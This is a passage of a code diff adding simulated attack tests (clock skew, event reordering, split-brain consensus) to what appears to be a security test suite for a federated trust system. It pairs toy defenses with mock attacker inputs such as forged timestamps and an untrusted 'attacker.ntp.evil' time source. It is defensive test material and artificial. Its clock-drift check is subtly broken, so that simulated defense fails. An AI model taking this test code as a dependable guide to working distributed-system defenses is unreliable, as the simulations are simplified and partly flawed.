@@ -18837,6 +18837,2395 @@ Current defenses: {defenses_held}/{total_defenses}
 
 
 # ---------------------------------------------------------------------------
+# Track DN: Temporal Consensus Attacks (Attacks 62-66)
+# ---------------------------------------------------------------------------
+
+def attack_clock_skew_exploitation() -> AttackResult:
+    """
+    ATTACK 62: CLOCK SKEW EXPLOITATION (Track DN)
+
+    Tests attacks that exploit timing differences between distributed nodes:
+
+    1. Clock Drift Attack: Exploit drifting clocks to extend deadlines
+    2. NTP Spoofing: Manipulate time sources to desync nodes
+    3. Heartbeat Desync: Create heartbeat timing gaps between federation members
+    4. Temporal Ordering Attack: Exploit weak ordering guarantees
+    5. Deadline Extension: Extend approval windows through clock manipulation
+
+    Temporal consensus is critical for distributed systems - clock attacks
+    can undermine ordering, deadlines, and coordination.
+    """
+    from datetime import datetime, timezone, timedelta
+    from collections import defaultdict
+
+    defenses = {
+        "clock_drift_detection": False,
+        "ntp_validation": False,
+        "heartbeat_sync_enforced": False,
+        "temporal_ordering_strict": False,
+        "deadline_monotonic": False,
+    }
+
+    # ========================================================================
+    # Defense 1: Clock Drift Detection
+    # ========================================================================
+
+    class ClockDriftDetector:
+        """Detect nodes with drifting clocks."""
+
+        def __init__(self, max_drift_seconds: float = 5.0):
+            self.max_drift = max_drift_seconds
+            self.node_timestamps: Dict[str, List[datetime]] = defaultdict(list)
+            self.reference_time: datetime = datetime.now(timezone.utc)
+
+        def record_timestamp(self, node_id: str, reported_time: datetime):
+            """Record a timestamp from a node."""
+            self.node_timestamps[node_id].append({
+                "reported": reported_time,
+                "received": datetime.now(timezone.utc),
+            })
+
+        def check_drift(self, node_id: str) -> Tuple[bool, str]:
+            """Check if a node has excessive clock drift."""
+            records = self.node_timestamps.get(node_id, [])
+            if len(records) < 2:
+                return False, "Insufficient data"
+
+            # Calculate drift between reported and received times
+            recent = records[-1]
+            drift = abs((recent["reported"] - recent["received"]).total_seconds())
+
+            if drift > self.max_drift:
+                return True, f"Clock drift detected: {drift:.2f}s (max: {self.max_drift}s)"
+
+            return False, f"Clock drift acceptable: {drift:.2f}s"
+
+    drift_detector = ClockDriftDetector(max_drift_seconds=5.0)
+
+    # Simulate attacker with manipulated clock
+    now = datetime.now(timezone.utc)
+    drift_detector.record_timestamp("honest_node", now)
+    drift_detector.record_timestamp("honest_node", now + timedelta(seconds=1))
+
+    # Attacker claims time 30 seconds ahead
+    drift_detector.record_timestamp("attacker_node", now + timedelta(seconds=30))
+
+    drifted, drift_msg = drift_detector.check_drift("attacker_node")
+
+    if drifted:
+        defenses["clock_drift_detection"] = True
+        drift_note = f"Clock drift detection: {drift_msg}"
+    else:
+        drift_note = f"Clock drift detection failed: {drift_msg}"
+
+    # ========================================================================
+    # Defense 2: NTP Validation
+    # ========================================================================
+
+    class NTPValidator:
+        """Validate time sources and detect NTP spoofing."""
+
+        def __init__(self, trusted_sources: List[str]):
+            self.trusted_sources = set(trusted_sources)
+            self.time_reports: Dict[str, List[datetime]] = defaultdict(list)
+
+        def validate_time_source(
+            self, source: str, reported_time: datetime
+        ) -> Tuple[bool, str]:
+            """Validate a time source is trusted and consistent."""
+            if source not in self.trusted_sources:
+                return False, f"Untrusted time source: {source}"
+
+            # Check for suspicious time jumps
+            prev_reports = self.time_reports.get(source, [])
+            if prev_reports:
+                last_report = prev_reports[-1]
+                jump = abs((reported_time - last_report).total_seconds())
+                if jump > 60:  # Max 1 minute jump
+                    return False, f"Suspicious time jump: {jump:.0f}s"
+
+            self.time_reports[source].append(reported_time)
+            return True, "Time source valid"
+
+        def check_consensus(
+            self, source_times: Dict[str, datetime], threshold: float = 5.0
+        ) -> Tuple[bool, str]:
+            """Check if multiple time sources agree."""
+            if len(source_times) < 2:
+                return False, "Need multiple sources for consensus"
+
+            times = list(source_times.values())
+            max_diff = max(
+                abs((t1 - t2).total_seconds())
+                for i, t1 in enumerate(times)
+                for t2 in times[i+1:]
+            )
+
+            if max_diff > threshold:
+                return False, f"Time sources disagree by {max_diff:.1f}s"
+
+            return True, f"Time consensus achieved (diff: {max_diff:.1f}s)"
+
+    ntp_validator = NTPValidator(["pool.ntp.org", "time.google.com", "time.aws.com"])
+
+    # Test untrusted source
+    valid, msg = ntp_validator.validate_time_source("attacker.ntp.evil", now)
+    if not valid:
+        defenses["ntp_validation"] = True
+        ntp_note = f"NTP validation blocked: {msg}"
+    else:
+        ntp_note = f"NTP validation: {msg}"
+
+    # ========================================================================
+    # Defense 3: Heartbeat Synchronization
+    # ========================================================================
+
+    class HeartbeatSyncEnforcer:
+        """Ensure heartbeats are synchronized across federation."""
+
+        def __init__(self, max_skew_blocks: int = 2):
+            self.max_skew = max_skew_blocks
+            self.node_heartbeats: Dict[str, int] = {}
+
+        def record_heartbeat(self, node_id: str, block_number: int):
+            """Record a heartbeat from a node."""
+            self.node_heartbeats[node_id] = block_number
+
+        def check_sync(self) -> Tuple[bool, str]:
+            """Check if all nodes are synchronized."""
+            if len(self.node_heartbeats) < 2:
+                return True, "Need multiple nodes"
+
+            blocks = list(self.node_heartbeats.values())
+            skew = max(blocks) - min(blocks)
+
+            if skew > self.max_skew:
+                return False, f"Heartbeat skew: {skew} blocks (max: {self.max_skew})"
+
+            return True, f"Heartbeats synchronized (skew: {skew})"
+
+    sync_enforcer = HeartbeatSyncEnforcer(max_skew_blocks=2)
+    sync_enforcer.record_heartbeat("node_a", 100)
+    sync_enforcer.record_heartbeat("node_b", 101)
+    sync_enforcer.record_heartbeat("attacker", 90)  # 10 blocks behind
+
+    synced, sync_msg = sync_enforcer.check_sync()
+
+    if not synced:
+        defenses["heartbeat_sync_enforced"] = True
+        sync_note = f"Heartbeat sync enforced: {sync_msg}"
+    else:
+        sync_note = f"Heartbeat sync: {sync_msg}"
+
+    # ========================================================================
+    # Defense 4: Temporal Ordering (Lamport/Vector Clocks)
+    # ========================================================================
+
+    class TemporalOrderingEnforcer:
+        """Enforce strict temporal ordering using logical clocks."""
+
+        def __init__(self):
+            self.logical_clocks: Dict[str, int] = defaultdict(int)
+            self.event_order: List[Tuple[str, int, str]] = []
+
+        def record_event(self, node_id: str, event_type: str) -> int:
+            """Record an event and return logical timestamp."""
+            self.logical_clocks[node_id] += 1
+            ts = self.logical_clocks[node_id]
+            self.event_order.append((node_id, ts, event_type))
+            return ts
+
+        def receive_event(
+            self, node_id: str, sender_ts: int, event_type: str
+        ) -> Tuple[bool, str]:
+            """Receive an event and validate ordering."""
+            # Update local clock to max of local and sender
+            local_ts = self.logical_clocks[node_id]
+            new_ts = max(local_ts, sender_ts) + 1
+            self.logical_clocks[node_id] = new_ts
+
+            # Check for causal violations
+            if sender_ts > new_ts + 10:  # Suspicious future timestamp
+                return False, f"Suspicious future timestamp: {sender_ts} vs local {local_ts}"
+
+            self.event_order.append((node_id, new_ts, f"recv:{event_type}"))
+            return True, f"Event ordered: ts={new_ts}"
+
+    ordering = TemporalOrderingEnforcer()
+    ordering.record_event("honest", "proposal")
+
+    # Attacker claims event from far future
+    valid, msg = ordering.receive_event("honest", 9999, "approval")
+
+    if not valid:
+        defenses["temporal_ordering_strict"] = True
+        order_note = f"Temporal ordering blocked: {msg}"
+    else:
+        order_note = f"Temporal ordering: {msg}"
+
+    # ========================================================================
+    # Defense 5: Monotonic Deadline Enforcement
+    # ========================================================================
+
+    class DeadlineEnforcer:
+        """Ensure deadlines are monotonic and cannot be extended."""
+
+        def __init__(self):
+            self.deadlines: Dict[str, datetime] = {}
+            self.original_deadlines: Dict[str, datetime] = {}
+
+        def set_deadline(
+            self, action_id: str, deadline: datetime
+        ) -> Tuple[bool, str]:
+            """Set a deadline for an action."""
+            if action_id in self.deadlines:
+                existing = self.deadlines[action_id]
+                if deadline > existing:
+                    return False, (
+                        f"Deadline extension rejected: cannot extend "
+                        f"from {existing.isoformat()} to {deadline.isoformat()}"
+                    )
+
+            self.deadlines[action_id] = deadline
+            if action_id not in self.original_deadlines:
+                self.original_deadlines[action_id] = deadline
+
+            return True, f"Deadline set: {deadline.isoformat()}"
+
+        def check_deadline(self, action_id: str) -> Tuple[bool, str]:
+            """Check if current time is before deadline."""
+            deadline = self.deadlines.get(action_id)
+            if not deadline:
+                return False, "No deadline set"
+
+            now = datetime.now(timezone.utc)
+            if now > deadline:
+                return False, f"Deadline passed: {deadline.isoformat()}"
+
+            return True, f"Deadline valid until {deadline.isoformat()}"
+
+    deadline_enforcer = DeadlineEnforcer()
+    original = datetime.now(timezone.utc) + timedelta(hours=1)
+    deadline_enforcer.set_deadline("proposal_123", original)
+
+    # Attacker tries to extend deadline
+    extended = datetime.now(timezone.utc) + timedelta(hours=10)
+    valid, msg = deadline_enforcer.set_deadline("proposal_123", extended)
+
+    if not valid:
+        defenses["deadline_monotonic"] = True
+        deadline_note = f"Deadline extension blocked: {msg}"
+    else:
+        deadline_note = f"Deadline: {msg}"
+
+    # ========================================================================
+    # Calculate Results
+    # ========================================================================
+
+    defenses_held = sum(defenses.values())
+    total_defenses = len(defenses)
+    attack_success = defenses_held < total_defenses - 2
+
+    return AttackResult(
+        attack_name="Clock Skew Exploitation (DN)",
+        success=attack_success,
+        setup_cost_atp=100.0,
+        gain_atp=1500.0 if attack_success else -100.0,
+        roi=15.0 if attack_success else -1.0,
+        detection_probability=0.65,
+        time_to_detection_hours=6,
+        blocks_until_detected=24,
+        trust_damage=0.75,
+        description=f"""
+CLOCK SKEW EXPLOITATION (Track DN):
+- Clock drift detection: {"DEFENDED" if defenses["clock_drift_detection"] else "VULNERABLE"}
+  {drift_note}
+- NTP validation: {"DEFENDED" if defenses["ntp_validation"] else "VULNERABLE"}
+  {ntp_note}
+- Heartbeat sync: {"DEFENDED" if defenses["heartbeat_sync_enforced"] else "VULNERABLE"}
+  {sync_note}
+- Temporal ordering: {"DEFENDED" if defenses["temporal_ordering_strict"] else "VULNERABLE"}
+  {order_note}
+- Deadline monotonic: {"DEFENDED" if defenses["deadline_monotonic"] else "VULNERABLE"}
+  {deadline_note}
+
+{defenses_held}/{total_defenses} defenses held.
+
+Clock skew attacks exploit timing differences to manipulate consensus,
+deadlines, and ordering in distributed systems.
+""".strip(),
+        mitigation=f"""
+Track DN: Clock Skew Exploitation Mitigation:
+1. Monitor and detect clock drift across nodes (max 5s tolerance)
+2. Validate NTP sources and require consensus from multiple trusted sources
+3. Enforce heartbeat synchronization with max block skew
+4. Use logical clocks (Lamport/vector) for causal ordering
+5. Make deadlines monotonic and immutable once set
+
+Current defenses: {defenses_held}/{total_defenses}
+""".strip(),
+        raw_data={
+            "defenses": defenses,
+            "defenses_held": defenses_held,
+            "total_defenses": total_defenses,
+        }
+    )
+
+
+def attack_temporal_ordering_manipulation() -> AttackResult:
+    """
+    ATTACK 63: TEMPORAL ORDERING MANIPULATION (Track DN)
+
+    Tests attacks that exploit weak ordering guarantees:
+
+    1. Out-of-Order Delivery: Process events in wrong order
+    2. Causal Violation: Break happens-before relationships
+    3. Concurrent Event Exploitation: Exploit ambiguous concurrent events
+    4. Reordering Attack: Reorder committed events
+    5. Phantom Event Injection: Inject events at arbitrary timestamps
+
+    Ordering attacks can cause inconsistent state across federation.
+    """
+    from datetime import datetime, timezone, timedelta
+    from collections import defaultdict
+    from typing import List, Tuple, Optional
+
+    defenses = {
+        "out_of_order_detection": False,
+        "causal_validation": False,
+        "concurrent_resolution": False,
+        "reordering_prevention": False,
+        "phantom_event_detection": False,
+    }
+
+    # ========================================================================
+    # Defense 1: Out-of-Order Detection
+    # ========================================================================
+
+    class OrderedEventLog:
+        """Event log that enforces ordering."""
+
+        def __init__(self):
+            self.events: List[dict] = []
+            self.last_sequence: Dict[str, int] = defaultdict(int)
+
+        def append_event(
+            self, source: str, sequence: int, event_type: str, data: dict
+        ) -> Tuple[bool, str]:
+            """Append an event, validating sequence."""
+            expected = self.last_sequence[source] + 1
+
+            if sequence < expected:
+                return False, (
+                    f"Out-of-order event: received seq {sequence}, "
+                    f"expected {expected}+"
+                )
+
+            if sequence > expected + 10:  # Allow small gaps
+                return False, (
+                    f"Sequence gap too large: received {sequence}, "
+                    f"expected ~{expected}"
+                )
+
+            self.last_sequence[source] = sequence
+            self.events.append({
+                "source": source,
+                "sequence": sequence,
+                "type": event_type,
+                "data": data,
+                "received_at": datetime.now(timezone.utc),
+            })
+            return True, f"Event accepted: seq={sequence}"
+
+    event_log = OrderedEventLog()
+    event_log.append_event("honest", 1, "proposal", {})
+    event_log.append_event("honest", 2, "vote", {})
+
+    # Attacker tries to inject old event
+    valid, msg = event_log.append_event("honest", 1, "revote", {})
+
+    if not valid:
+        defenses["out_of_order_detection"] = True
+        order_note = f"Out-of-order blocked: {msg}"
+    else:
+        order_note = f"Out-of-order: {msg}"
+
+    # ========================================================================
+    # Defense 2: Causal Validation
+    # ========================================================================
+
+    class CausalValidator:
+        """Validate causal relationships between events."""
+
+        def __init__(self):
+            self.events: Dict[str, dict] = {}
+            self.dependencies: Dict[str, List[str]] = defaultdict(list)
+
+        def register_event(
+            self, event_id: str, depends_on: List[str] = None
+        ) -> Tuple[bool, str]:
+            """Register an event with its causal dependencies."""
+            depends_on = depends_on or []
+
+            # Check all dependencies exist
+            for dep_id in depends_on:
+                if dep_id not in self.events:
+                    return False, f"Causal violation: missing dependency {dep_id}"
+
+            self.events[event_id] = {
+                "id": event_id,
+                "depends_on": depends_on,
+                "registered_at": datetime.now(timezone.utc),
+            }
+            self.dependencies[event_id] = depends_on
+            return True, f"Event {event_id} registered"
+
+    causal = CausalValidator()
+    causal.register_event("genesis", [])
+    causal.register_event("proposal_1", ["genesis"])
+    causal.register_event("approval_1", ["proposal_1"])
+
+    # Attacker tries to reference non-existent event
+    valid, msg = causal.register_event("phantom_approval", ["fake_proposal"])
+
+    if not valid:
+        defenses["causal_validation"] = True
+        causal_note = f"Causal validation blocked: {msg}"
+    else:
+        causal_note = f"Causal validation: {msg}"
+
+    # ========================================================================
+    # Defense 3: Concurrent Event Resolution
+    # ========================================================================
+
+    class ConcurrentResolver:
+        """Deterministically resolve concurrent events."""
+
+        def __init__(self):
+            self.events: List[dict] = []
+
+        def add_concurrent(
+            self, event_id: str, timestamp: datetime, priority: int
+        ):
+            """Add an event that may be concurrent with others."""
+            self.events.append({
+                "id": event_id,
+                "timestamp": timestamp,
+                "priority": priority,
+            })
+
+        def resolve_order(self) -> List[str]:
+            """Resolve ordering of concurrent events deterministically."""
+            # Sort by: timestamp first, then priority, then id for tie-breaking
+            sorted_events = sorted(
+                self.events,
+                key=lambda e: (e["timestamp"], -e["priority"], e["id"])
+            )
+            return [e["id"] for e in sorted_events]
+
+        def check_deterministic(self) -> Tuple[bool, str]:
+            """Verify resolution is deterministic."""
+            order1 = self.resolve_order()
+            order2 = self.resolve_order()
+
+            if order1 == order2:
+                return True, f"Deterministic order: {order1}"
+            return False, f"Non-deterministic: {order1} vs {order2}"
+
+    resolver = ConcurrentResolver()
+    now = datetime.now(timezone.utc)
+    resolver.add_concurrent("event_a", now, priority=1)
+    resolver.add_concurrent("event_b", now, priority=2)
+    resolver.add_concurrent("event_c", now, priority=1)
+
+    deterministic, msg = resolver.check_deterministic()
+
+    if deterministic:
+        defenses["concurrent_resolution"] = True
+        concurrent_note = f"Concurrent resolution: {msg}"
+    else:
+        concurrent_note = f"Concurrent resolution failed: {msg}"
+
+    # ========================================================================
+    # Defense 4: Reordering Prevention
+    # ========================================================================
+
+    class CommitLog:
+        """Immutable commit log that prevents reordering."""
+
+        def __init__(self):
+            self.commits: List[dict] = []
+            self.commit_hashes: Dict[str, int] = {}
+
+        def _hash_commit(self, prev_hash: str, data: str) -> str:
+            """Create hash chain."""
+            import hashlib
+            return hashlib.sha256(f"{prev_hash}:{data}".encode()).hexdigest()[:16]
+
+        def commit(self, data: str) -> str:
+            """Commit data to log."""
+            prev_hash = self.commits[-1]["hash"] if self.commits else "genesis"
+            new_hash = self._hash_commit(prev_hash, data)
+
+            commit = {
+                "index": len(self.commits),
+                "prev_hash": prev_hash,
+                "hash": new_hash,
+                "data": data,
+            }
+            self.commits.append(commit)
+            self.commit_hashes[new_hash] = len(self.commits) - 1
+            return new_hash
+
+        def verify_order(self) -> Tuple[bool, str]:
+            """Verify commit order is intact."""
+            for i, commit in enumerate(self.commits):
+                if i == 0:
+                    if commit["prev_hash"] != "genesis":
+                        return False, f"Invalid genesis: {commit['prev_hash']}"
+                else:
+                    expected_prev = self.commits[i-1]["hash"]
+                    if commit["prev_hash"] != expected_prev:
+                        return False, (
+                            f"Reordering detected at {i}: "
+                            f"prev={commit['prev_hash']}, expected={expected_prev}"
+                        )
+            return True, f"Order verified: {len(self.commits)} commits"
+
+        def try_reorder(self, idx1: int, idx2: int) -> Tuple[bool, str]:
+            """Attempt to reorder commits (should fail)."""
+            if idx1 >= len(self.commits) or idx2 >= len(self.commits):
+                return False, "Invalid indices"
+
+            # Swap
+            self.commits[idx1], self.commits[idx2] = \
+                self.commits[idx2], self.commits[idx1]
+
+            # Verify - should fail
+            valid, msg = self.verify_order()
+
+            # Restore
+            self.commits[idx1], self.commits[idx2] = \
+                self.commits[idx2], self.commits[idx1]
+
+            return not valid, f"Reorder attempt detected: {msg}"
+
+    commit_log = CommitLog()
+    commit_log.commit("event_1")
+    commit_log.commit("event_2")
+    commit_log.commit("event_3")
+
+    detected, msg = commit_log.try_reorder(1, 2)
+
+    if detected:
+        defenses["reordering_prevention"] = True
+        reorder_note = f"Reordering prevention: {msg}"
+    else:
+        reorder_note = f"Reordering prevention failed: {msg}"
+
+    # ========================================================================
+    # Defense 5: Phantom Event Detection
+    # ========================================================================
+
+    class PhantomDetector:
+        """Detect events injected at arbitrary timestamps."""
+
+        def __init__(self):
+            self.event_windows: Dict[str, Tuple[datetime, datetime]] = {}
+            self.events: List[dict] = []
+
+        def open_window(self, source: str, duration_seconds: int = 60):
+            """Open a submission window for a source."""
+            now = datetime.now(timezone.utc)
+            self.event_windows[source] = (
+                now,
+                now + timedelta(seconds=duration_seconds)
+            )
+
+        def submit_event(
+            self, source: str, event_time: datetime, data: dict
+        ) -> Tuple[bool, str]:
+            """Submit an event, validating it's within window."""
+            window = self.event_windows.get(source)
+            if not window:
+                return False, f"No open window for source: {source}"
+
+            window_start, window_end = window
+
+            # Event must claim time within window
+            if event_time < window_start or event_time > window_end:
+                return False, (
+                    f"Phantom event: claimed time {event_time.isoformat()} "
+                    f"outside window [{window_start.isoformat()}, "
+                    f"{window_end.isoformat()}]"
+                )
+
+            # Event receive time must be reasonable
+            now = datetime.now(timezone.utc)
+            if event_time > now + timedelta(seconds=5):  # Max 5s future
+                return False, f"Phantom event: claims future time {event_time.isoformat()}"
+
+            self.events.append({
+                "source": source,
+                "claimed_time": event_time,
+                "received_time": now,
+                "data": data,
+            })
+            return True, f"Event accepted at {event_time.isoformat()}"
+
+    phantom = PhantomDetector()
+    phantom.open_window("honest")
+
+    # Attacker injects event claiming old timestamp
+    old_time = datetime.now(timezone.utc) - timedelta(hours=1)
+    valid, msg = phantom.submit_event("honest", old_time, {"type": "fake"})
+
+    if not valid:
+        defenses["phantom_event_detection"] = True
+        phantom_note = f"Phantom detection blocked: {msg}"
+    else:
+        phantom_note = f"Phantom detection: {msg}"
+
+    # ========================================================================
+    # Calculate Results
+    # ========================================================================
+
+    defenses_held = sum(defenses.values())
+    total_defenses = len(defenses)
+    attack_success = defenses_held < total_defenses - 2
+
+    return AttackResult(
+        attack_name="Temporal Ordering Manipulation (DN)",
+        success=attack_success,
+        setup_cost_atp=150.0,
+        gain_atp=2000.0 if attack_success else -150.0,
+        roi=13.3 if attack_success else -1.0,
+        detection_probability=0.70,
+        time_to_detection_hours=4,
+        blocks_until_detected=16,
+        trust_damage=0.80,
+        description=f"""
+TEMPORAL ORDERING MANIPULATION (Track DN):
+- Out-of-order detection: {"DEFENDED" if defenses["out_of_order_detection"] else "VULNERABLE"}
+  {order_note}
+- Causal validation: {"DEFENDED" if defenses["causal_validation"] else "VULNERABLE"}
+  {causal_note}
+- Concurrent resolution: {"DEFENDED" if defenses["concurrent_resolution"] else "VULNERABLE"}
+  {concurrent_note}
+- Reordering prevention: {"DEFENDED" if defenses["reordering_prevention"] else "VULNERABLE"}
+  {reorder_note}
+- Phantom event detection: {"DEFENDED" if defenses["phantom_event_detection"] else "VULNERABLE"}
+  {phantom_note}
+
+{defenses_held}/{total_defenses} defenses held.
+
+Temporal ordering attacks cause inconsistent state by manipulating
+the sequence of events in a distributed system.
+""".strip(),
+        mitigation=f"""
+Track DN: Temporal Ordering Manipulation Mitigation:
+1. Enforce sequence numbers and reject out-of-order events
+2. Validate causal dependencies before accepting events
+3. Use deterministic tie-breaking for concurrent events
+4. Hash-chain commits to prevent reordering
+5. Detect phantom events outside valid submission windows
+
+Current defenses: {defenses_held}/{total_defenses}
+""".strip(),
+        raw_data={
+            "defenses": defenses,
+            "defenses_held": defenses_held,
+            "total_defenses": total_defenses,
+        }
+    )
+
+
+def attack_consensus_split_brain() -> AttackResult:
+    """
+    ATTACK 64: CONSENSUS SPLIT-BRAIN ATTACK (Track DN)
+
+    Tests attacks that cause consensus to diverge:
+
+    1. Partition Exploitation: Exploit network partitions for double-voting
+    2. View Change Attack: Force unnecessary view changes
+    3. Leader Manipulation: Force specific leader election outcomes
+    4. Quorum Starvation: Prevent quorum from forming
+    5. Fork Creation: Create competing valid histories
+
+    Split-brain can cause irreversible state inconsistencies.
+    """
+    from datetime import datetime, timezone, timedelta
+    from collections import defaultdict
+    from typing import Set, List, Dict
+
+    defenses = {
+        "partition_detection": False,
+        "view_change_protection": False,
+        "leader_verification": False,
+        "quorum_maintenance": False,
+        "fork_detection": False,
+    }
+
+    # ========================================================================
+    # Defense 1: Partition Detection
+    # ========================================================================
+
+    class PartitionDetector:
+        """Detect network partitions between nodes."""
+
+        def __init__(self, nodes: List[str], timeout_seconds: float = 10.0):
+            self.nodes = set(nodes)
+            self.timeout = timeout_seconds
+            self.last_seen: Dict[str, datetime] = {
+                n: datetime.now(timezone.utc) for n in nodes
+            }
+            self.connectivity: Dict[str, Set[str]] = {
+                n: set(nodes) for n in nodes
+            }
+
+        def heartbeat(self, node: str):
+            """Record heartbeat from node."""
+            self.last_seen[node] = datetime.now(timezone.utc)
+
+        def report_unreachable(self, reporter: str, target: str):
+            """Node reports another as unreachable."""
+            if reporter in self.connectivity:
+                self.connectivity[reporter].discard(target)
+
+        def detect_partition(self) -> Tuple[bool, str]:
+            """Check for network partition."""
+            now = datetime.now(timezone.utc)
+
+            # Check for nodes not seen recently
+            missing = []
+            for node in self.nodes:
+                elapsed = (now - self.last_seen[node]).total_seconds()
+                if elapsed > self.timeout:
+                    missing.append(node)
+
+            if missing:
+                return True, f"Partition detected: missing nodes {missing}"
+
+            # Check connectivity graphs
+            for node, reachable in self.connectivity.items():
+                if len(reachable) < len(self.nodes) // 2:
+                    return True, f"Partition detected: {node} isolated"
+
+            return False, "No partition detected"
+
+    partition_detector = PartitionDetector(["node_a", "node_b", "node_c", "attacker"])
+    partition_detector.report_unreachable("node_a", "attacker")
+    partition_detector.report_unreachable("node_b", "attacker")
+    partition_detector.report_unreachable("node_c", "attacker")
+
+    partitioned, msg = partition_detector.detect_partition()
+
+    if partitioned:
+        defenses["partition_detection"] = True
+        partition_note = f"Partition detected: {msg}"
+    else:
+        partition_note = f"Partition detection: {msg}"
+
+    # ========================================================================
+    # Defense 2: View Change Protection
+    # ========================================================================
+
+    class ViewChangeProtection:
+        """Prevent frivolous view changes."""
+
+        def __init__(self, min_interval_seconds: float = 60.0):
+            self.min_interval = min_interval_seconds
+            self.current_view = 0
+            self.last_change = datetime.now(timezone.utc) - timedelta(hours=1)
+            self.change_requests: Dict[int, Set[str]] = defaultdict(set)
+
+        def request_view_change(
+            self, requester: str, to_view: int, reason: str
+        ) -> Tuple[bool, str]:
+            """Request a view change."""
+            # Must be next view
+            if to_view != self.current_view + 1:
+                return False, f"Invalid view: {to_view} (current: {self.current_view})"
+
+            # Rate limit
+            elapsed = (datetime.now(timezone.utc) - self.last_change).total_seconds()
+            if elapsed < self.min_interval:
+                return False, (
+                    f"View change too soon: {elapsed:.0f}s < {self.min_interval}s"
+                )
+
+            self.change_requests[to_view].add(requester)
+            return True, f"View change requested: {to_view}"
+
+        def execute_view_change(
+            self, to_view: int, quorum_size: int
+        ) -> Tuple[bool, str]:
+            """Execute view change if quorum reached."""
+            requests = self.change_requests.get(to_view, set())
+
+            if len(requests) < quorum_size:
+                return False, (
+                    f"Insufficient requests: {len(requests)} < {quorum_size}"
+                )
+
+            self.current_view = to_view
+            self.last_change = datetime.now(timezone.utc)
+            return True, f"View changed to {to_view}"
+
+    view_protection = ViewChangeProtection(min_interval_seconds=60.0)
+
+    # Attacker tries rapid view changes
+    view_protection.last_change = datetime.now(timezone.utc) - timedelta(seconds=10)
+    valid, msg = view_protection.request_view_change("attacker", 1, "spam")
+
+    if not valid:
+        defenses["view_change_protection"] = True
+        view_note = f"View change blocked: {msg}"
+    else:
+        view_note = f"View change: {msg}"
+
+    # ========================================================================
+    # Defense 3: Leader Verification
+    # ========================================================================
+
+    class LeaderVerification:
+        """Verify leader election is valid."""
+
+        def __init__(self, nodes: List[str]):
+            self.nodes = nodes
+            self.current_leader: Optional[str] = None
+            self.election_proof: Dict[str, List[str]] = {}
+
+        def elect_leader(
+            self, candidate: str, votes: List[str]
+        ) -> Tuple[bool, str]:
+            """Elect a leader with votes."""
+            if candidate not in self.nodes:
+                return False, f"Invalid candidate: {candidate} not in nodes"
+
+            # Validate voters are nodes
+            invalid_voters = [v for v in votes if v not in self.nodes]
+            if invalid_voters:
+                return False, f"Invalid voters: {invalid_voters}"
+
+            # Require majority
+            quorum = len(self.nodes) // 2 + 1
+            if len(set(votes)) < quorum:
+                return False, (
+                    f"Insufficient votes: {len(set(votes))} < {quorum}"
+                )
+
+            self.current_leader = candidate
+            self.election_proof[candidate] = votes
+            return True, f"Leader elected: {candidate} with {len(votes)} votes"
+
+        def verify_leader_action(
+            self, actor: str, action: str
+        ) -> Tuple[bool, str]:
+            """Verify an action comes from current leader."""
+            if actor != self.current_leader:
+                return False, (
+                    f"Non-leader action: {actor} is not leader "
+                    f"({self.current_leader})"
+                )
+
+            return True, f"Leader action verified: {actor}"
+
+    leader_verify = LeaderVerification(["node_a", "node_b", "node_c", "node_d"])
+    leader_verify.elect_leader("node_a", ["node_a", "node_b", "node_c"])
+
+    # Attacker claims to be leader
+    valid, msg = leader_verify.verify_leader_action("attacker", "commit")
+
+    if not valid:
+        defenses["leader_verification"] = True
+        leader_note = f"Leader verification blocked: {msg}"
+    else:
+        leader_note = f"Leader verification: {msg}"
+
+    # ========================================================================
+    # Defense 4: Quorum Maintenance
+    # ========================================================================
+
+    class QuorumMaintainer:
+        """Ensure quorum is maintained for consensus."""
+
+        def __init__(self, nodes: list):
+            self.nodes = set(nodes)
+            self.available: set = set(nodes)
+            self.quorum_size = len(nodes) // 2 + 1
+
+        def mark_unavailable(self, node: str) -> Tuple[bool, str]:
+            """Mark a node as unavailable."""
+            if node not in self.nodes:
+                return False, f"Unknown node: {node}"
+
+            self.available.discard(node)
+
+            if len(self.available) < self.quorum_size:
+                return False, (
+                    f"Quorum lost: {len(self.available)} < {self.quorum_size}"
+                )
+
+            return True, f"Node {node} marked unavailable, quorum maintained"
+
+        def can_reach_consensus(self) -> Tuple[bool, str]:
+            """Check if consensus is possible."""
+            if len(self.available) >= self.quorum_size:
+                return True, f"Quorum available: {len(self.available)}"
+            return False, f"Quorum unavailable: {len(self.available)}"
+
+    quorum = QuorumMaintainer(["node_a", "node_b", "node_c", "node_d", "node_e"])
+
+    # Attacker tries to starve quorum
+    quorum.mark_unavailable("node_a")
+    quorum.mark_unavailable("node_b")
+    valid, msg = quorum.mark_unavailable("node_c")
+
+    if not valid:
+        defenses["quorum_maintenance"] = True
+        quorum_note = f"Quorum maintenance blocked: {msg}"
+    else:
+        quorum_note = f"Quorum maintenance: {msg}"
+
+    # ========================================================================
+    # Defense 5: Fork Detection
+    # ========================================================================
+
+    class ForkDetector:
+        """Detect competing histories (forks)."""
+
+        def __init__(self):
+            self.chains: Dict[str, List[str]] = {}
+
+        def report_chain(
+            self, source: str, chain_hashes: List[str]
+        ):
+            """Report a chain from a node."""
+            self.chains[source] = chain_hashes
+
+        def detect_fork(self) -> Tuple[bool, str]:
+            """Check for forks in reported chains."""
+            if len(self.chains) < 2:
+                return False, "Insufficient chains to compare"
+
+            chains = list(self.chains.values())
+
+            # Find common prefix length
+            min_len = min(len(c) for c in chains)
+            fork_point = None
+
+            for i in range(min_len):
+                hashes_at_i = set(c[i] for c in chains)
+                if len(hashes_at_i) > 1:
+                    fork_point = i
+                    break
+
+            if fork_point is not None:
+                return True, f"Fork detected at index {fork_point}"
+
+            # Check for divergent suffixes
+            max_len = max(len(c) for c in chains)
+            if max_len > min_len:
+                # Chains have different lengths - check they share prefix
+                for c1 in chains:
+                    for c2 in chains:
+                        if c1[:min_len] != c2[:min_len]:
+                            return True, "Fork: chains diverge"
+
+            return False, f"No fork detected (chains aligned at depth {min_len})"
+
+    fork_detector = ForkDetector()
+    fork_detector.report_chain("node_a", ["h1", "h2", "h3"])
+    fork_detector.report_chain("node_b", ["h1", "h2", "h3"])
+    fork_detector.report_chain("attacker", ["h1", "h2", "h3_alt"])  # Fork!
+
+    forked, msg = fork_detector.detect_fork()
+
+    if forked:
+        defenses["fork_detection"] = True
+        fork_note = f"Fork detection: {msg}"
+    else:
+        fork_note = f"Fork detection failed: {msg}"
+
+    # ========================================================================
+    # Calculate Results
+    # ========================================================================
+
+    defenses_held = sum(defenses.values())
+    total_defenses = len(defenses)
+    attack_success = defenses_held < total_defenses - 2
+
+    return AttackResult(
+        attack_name="Consensus Split-Brain (DN)",
+        success=attack_success,
